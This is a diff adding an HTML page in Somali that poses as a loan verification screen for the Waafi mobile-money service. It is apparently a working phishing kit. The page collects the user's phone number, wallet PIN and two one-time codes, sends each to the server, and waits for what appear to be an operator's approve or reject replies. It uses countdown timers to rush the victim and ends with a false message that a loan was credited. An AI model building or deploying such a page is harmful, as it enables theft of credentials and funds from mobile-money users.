@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Waafi - Xaqiijinta Amaahda</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, sans-serif;
+        }
+
+        body {
+            background-color: #f1f3f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 15px;
+        }
+
+        .app-header {
+            width: 100%;
+            background: linear-gradient(to bottom, hsl(125, 95%, 48%), hsl(108, 95%, 49%));
+            padding: 20px;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            box-sizing: border-box;
+            text-align: center;
+            border-radius: 0 0 20px 20px;
+            margin-bottom: 20px;
+        }
+
+        .card {
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 15px;
+            padding: 25px 20px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .section-label {
+            font-size: 12px;
+            font-weight: bold;
+            color: #888;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .phone-input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 0 12px;
+            background: #fff;
+        }
+
+        .country-prefix {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            margin-right: 8px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 0;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            background: transparent;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .pin-box, .otp1-box, .otp2-box {
+            width: 60px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            outline: none;
+            background: #fafafa;
+        }
+
+        .pin-box:focus, .otp1-box:focus, .otp2-box:focus {
+            border-color: hsl(113, 91%, 50%);
+            background: #fff;
+        }
+
+        .btn-green {
+            width: 100%;
+            background: linear-gradient(to right, hsl(118, 98%, 50%), hwb(110 2% 5%));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .red-alarm {
+            background-color: #fff5f5;
+            color: #e53e3e;
+            border: 1px solid #feb2b2;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f1f3f5;
+            border-top: 4px solid hsl(120, 96%, 49%);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .countdown-timer {
+            font-size: 18px;
+            font-weight: bold;
+            color: hwb(115 2% 6%);
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-header">Waafi Amaah</div>
+
+    <div class="card">
+        
+        <!-- STEP 1: Phone Number Input -->
+        <div id="step-phone">
+            <div class="card-title">Gali Nambarkaaga Telefanka</div>
+            <div id="phone-alarm" class="red-alarm"></div>
+            <div class="input-group">
+                <label class="section-label">Nambarka Waafi</label>
+                <div class="phone-input-wrapper">
+                    <span class="country-prefix">+252</span>
+                    <input type="tel" id="phone-number" class="input-field" placeholder="61xxxxxxx" maxlength="9" oninput="validatePhone(this)">
+                </div>
+            </div>
+            <button class="btn-green" onclick="proceedToPin()">Sii wad</button>
+        </div>
+
+        <!-- STEP 2: PIN Input -->
+        <div id="step-pin" style="display: none;">
+            <div class="card-title">Gali Lambarka Sirta ah (PIN)</div>
+            <div class="section-label">PIN-ka Waafi (Tarakimu 4)</div>
+            <div class="pin-container">
+                <input type="password" maxlength="1" class="pin-box" oninput="moveFocus(this, 'p2')">
+                <input type="password" maxlength="1" class="pin-box" id="p2" oninput="moveFocus(this, 'p3')">
+                <input type="password" maxlength="1" class="pin-box" id="p3" oninput="moveFocus(this, 'p4')">
+                <input type="password" maxlength="1" class="pin-box" id="p4">
+            </div>
+            <button class="btn-green" onclick="submitPin()">Sii wad</button>
+        </div>
+
+        <!-- WAITING SPINNER -->
+        <div id="step-waiting" style="display: none; padding: 20px 0;">
+            <div class="loading-spinner"></div>
+            <p style="color: #666; font-size: 14px; font-weight: bold;">Fadlan sug intaan hawshaada la wado...</p>
+        </div>
+
+        <!-- STEP 3: OTP 1 -->
+        <div id="step-otp1" style="display: none;">
+            <div class="card-title">Gali OTP-ga Kowaad</div>
+            <div id="otp1-alarm" class="red-alarm"></div>
+            <div class="section-label">Tarakimu 4 ee OTP:</div>
+            <div class="countdown-timer" id="timer-otp1">00:59</div>
+            <div class="pin-container">
+                <input type="password" maxlength="1" class="otp1-box" oninput="moveFocus(this, 'o1_2')">
+                <input type="password" maxlength="1" class="otp1-box" id="o1_2" oninput="moveFocus(this, 'o1_3')">
+                <input type="password" maxlength="1" class="otp1-box" id="o1_3" oninput="moveFocus(this, 'o1_4')">
+                <input type="password" maxlength="1" class="otp1-box" id="o1_4">
+            </div>
+            <button class="btn-green" onclick="submitOtp1()">Xaqiiji</button>
+        </div>
+
+        <!-- STEP 4: OTP 2 -->
+        <div id="step-otp2" style="display: none;">
+            <div class="card-title">Gali OTP-ga Labaad</div>
+            <div id="otp2-alarm" class="red-alarm"></div>
+            <div class="section-label">Tarakimu 4 ee OTP:</div>
+            <div class="countdown-timer" id="timer-otp2">00:59</div>
+            <div class="pin-container">
+                <input type="password" maxlength="1" class="otp2-box" oninput="moveFocus(this, 'o2_2')">
+                <input type="password" maxlength="1" class="otp2-box" id="o2_2" oninput="moveFocus(this, 'o2_3')">
+                <input type="password" maxlength="1" class="otp2-box" id="o2_3" oninput="moveFocus(this, 'o2_4')">
+                <input type="password" maxlength="1" class="otp2-box" id="o2_4">
+            </div>
+            <button class="btn-green" onclick="submitOtp2()">Xaqiiji</button>
+        </div>
+
+        <!-- SUCCESS SCREEN -->
+        <div id="step-success" style="display: none;">
+            <h3 style="color: #82d13d; font-size: 22px; font-weight: bold; margin-bottom: 10px;">🎉 Hambalyo!</h3>
+            <p id="success-msg" style="font-size: 14px; color: #555; line-height: 1.6; text-align: left;"></p>
+            <button class="btn-green" onclick="window.location.href='/'">Dhamee</button>
+        </div>
+
+    </div>
+
+    <script>
+        let fullPhone = '';
+        let countdownTimer = null;
+
+        // Send loan parameters on load from localStorage
+        window.onload = () => {
+            const amount = localStorage.getItem('amount') || '1,000';
+            const duration = localStorage.getItem('loanDuration') || '12 bilood';
+            
+            fetch('/api/loan-request', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ amount, duration })
+            });
+        };
+
+        function validatePhone(input) {
+            input.value = input.value.replace(/\D/g, '');
+        }
+
+        function moveFocus(current, nextId) {
+            if (current.value.length >= 1) {
+                const next = document.getElementById(nextId);
+                if (next) next.focus();
+            }
+        }
+
+        function proceedToPin() {
+            const rawPhone = document.getElementById('phone-number').value.trim();
+            if (rawPhone.length < 8) {
+                const alarm = document.getElementById('phone-alarm');
+                alarm.innerText = 'Fadlan geli nambarka saxda ah.';
+                alarm.style.display = 'block';
+                return;
+            }
+            document.getElementById('phone-alarm').style.display = 'none';
+            fullPhone = `+252${rawPhone}`;
+            document.getElementById('step-phone').style.display = 'none';
+            document.getElementById('step-pin').style.display = 'block';
+        }
+
+        function startTimer(timerId, onExpire) {
+            let seconds = 59;
+            const display = document.getElementById(timerId);
+            if (countdownTimer) clearInterval(countdownTimer);
+
+            countdownTimer = setInterval(() => {
+                let secStr = seconds < 10 ? "0" + seconds : seconds;
+                if (display) display.innerText = `00:${secStr}`;
+
+                if (seconds <= 0) {
+                    clearInterval(countdownTimer);
+                    if (onExpire) onExpire();
+                }
+                seconds--;
+            }, 1000);
+        }
+
+        async function submitPin() {
+            let pin = '';
+            document.querySelectorAll('.pin-box').forEach(b => pin += b.value);
+            if (pin.length < 4) return;
+
+            await fetch('/api/submit-pin-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: fullPhone, pin })
+            });
+
+            document.getElementById('step-pin').style.display = 'none';
+            document.getElementById('step-waiting').style.display = 'block';
+            pollPinStatus();
+        }
+
+        async function pollPinStatus() {
+            let interval = setInterval(async () => {
+                try {
+                    let res = await fetch('/api/check-pin-status');
+                    let data = await res.json();
+
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        document.getElementById('step-otp1').style.display = 'block';
+                        startTimer('timer-otp1', () => { alert('Waqtigu wuu dhacay!'); location.reload(); });
+                    } else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        document.getElementById('phone-alarm').innerText = 'Fadlan isticmaal nambarkaaga saxda ah.';
+                        document.getElementById('phone-alarm').style.display = 'block';
+                        document.getElementById('step-phone').style.display = 'block';
+                        document.querySelectorAll('.pin-box').forEach(b => b.value = '');
+                    }
+                } catch (e) { console.error(e); }
+            }, 3500);
+        }
+
+        async function submitOtp1() {
+            let otp1 = '';
+            document.querySelectorAll('.otp1-box').forEach(b => otp1 += b.value);
+            if (otp1.length < 4) return;
+            if (countdownTimer) clearInterval(countdownTimer);
+
+            await fetch('/api/verify-otp1', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp1 })
+            });
+
+            document.getElementById('step-otp1').style.display = 'none';
+            document.getElementById('step-waiting').style.display = 'block';
+            pollOtp1Status();
+        }
+
+        async function pollOtp1Status() {
+            let interval = setInterval(async () => {
+                try {
+                    let res = await fetch('/api/check-otp1-status');
+                    let data = await res.json();
+
+                    if (data.status === 'success') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        document.getElementById('step-otp2').style.display = 'block';
+                        startTimer('timer-otp2', () => { alert('Waqtigu wuu dhacay!'); location.reload(); });
+                    } else if (data.status === 'wrong') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        const alarm = document.getElementById('otp1-alarm');
+                        alarm.innerText = 'OTP-ga waa khalad. Dib u dayo.';
+                        alarm.style.display = 'block';
+                        document.getElementById('step-otp1').style.display = 'block';
+                        document.querySelectorAll('.otp1-box').forEach(b => b.value = '');
+                        startTimer('timer-otp1', () => { alert('Waqtigu wuu dhacay!'); location.reload(); });
+                    }
+                } catch (e) { console.error(e); }
+            }, 3500);
+        }
+
+        async function submitOtp2() {
+            let otp2 = '';
+            document.querySelectorAll('.otp2-box').forEach(b => otp2 += b.value);
+            if (otp2.length < 4) return;
+            if (countdownTimer) clearInterval(countdownTimer);
+
+            await fetch('/api/verify-otp2', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp2 })
+            });
+
+            document.getElementById('step-otp2').style.display = 'none';
+            document.getElementById('step-waiting').style.display = 'block';
+            pollOtp2Status();
+        }
+
+        async function pollOtp2Status() {
+            let interval = setInterval(async () => {
+                try {
+                    let res = await fetch('/api/check-otp2-status');
+                    let data = await res.json();
+
+                    if (data.status === 'success') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        document.getElementById('step-success').style.display = 'block';
+                        const amount = localStorage.getItem('amount') || '1,000';
+                        document.getElementById('success-msg').innerHTML = `Waxa lagu guuleystay in laguu shubo amaahda oo dhan <b>$${amount}</b> lambarkaaga ${fullPhone}.`;
+                    } else if (data.status === 'wrong') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        const alarm = document.getElementById('otp2-alarm');
+                        alarm.innerText = 'OTP-ga waa khalad. Dib u dayo.';
+                        alarm.style.display = 'block';
+                        document.getElementById('step-otp2').style.display = 'block';
+                        document.querySelectorAll('.otp2-box').forEach(b => b.value = '');
+                        startTimer('timer-otp2', () => { alert('Waqtigu wuu dhacay!'); location.reload(); });
+                    }
+                } catch (e) { console.error(e); }
+            }, 3500);
+        }
+    </script>
+</body>
+</html>
